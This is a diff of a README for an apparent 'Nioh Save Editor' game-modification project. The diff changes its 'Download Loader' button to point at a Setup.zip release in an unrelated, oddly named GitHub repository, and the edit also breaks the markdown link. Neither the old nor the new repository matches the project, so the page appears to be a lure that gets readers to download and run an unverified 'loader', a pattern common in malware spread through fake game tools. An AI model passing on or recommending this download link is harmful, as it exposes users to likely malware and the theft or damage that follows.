@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Nioh Save Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Nioh-Save-Editor` · Updated: 2026-10-24
 
 **Tags:** `nioh` `save-editor` `action-rpg` `soulslike` `steam`
+
